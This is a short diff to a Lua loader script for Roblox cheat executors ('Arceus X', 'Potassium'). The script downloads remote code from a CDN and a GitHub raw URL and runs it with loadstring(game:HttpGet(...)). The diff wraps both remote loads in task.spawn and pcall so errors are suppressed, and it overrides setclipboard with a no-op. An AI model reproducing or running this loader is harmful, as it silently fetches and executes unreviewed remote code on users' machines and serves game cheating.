@@ -11,11 +11,18 @@ if identifyexecutor and (
     identifyexecutor() == "Arceus X" or
     identifyexecutor() == "Potassium"
 ) then
-    
+task.spawn(function()
+    pcall(function() 
 setclipboard = function() return end
 ID="6710c962-7192-471b-8f42-cf9a1a8c4ab5";
-RUN_AFTER=nil;
 loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
+    end)
+end)
 else
+task.spawn(function()
+    pcall(function() 
+      setclipboard = function() return end
     loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testd3"))()
+    end)
+end)
 end
